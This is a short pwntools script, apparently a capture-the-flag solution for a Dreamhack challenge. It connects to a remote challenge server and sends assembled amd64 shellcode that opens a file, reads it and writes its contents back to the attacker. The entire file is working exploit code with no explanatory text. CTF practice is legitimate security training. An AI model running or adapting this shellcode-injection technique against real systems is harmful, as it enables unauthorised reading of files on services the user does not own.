from pwn import *

context.log_level = 'Debug'
context.update(arch= 'amd64', os='linux')

p = remote("host3.dreamhack.games" ,12682)

flag = 'flag_name_is_loooooong'

sc = ''
sc += shellcraft.pushstr(flag)
sc += shellcraft.open('rsp', 0, None)
sc += shellcraft.read('rax', 'rsp', 100)
sc += shellcraft.write(1, 'rsp', 100)
sc += shellcraft.exit()
sc = asm(sc)

p.send(sc)
p.interactive()
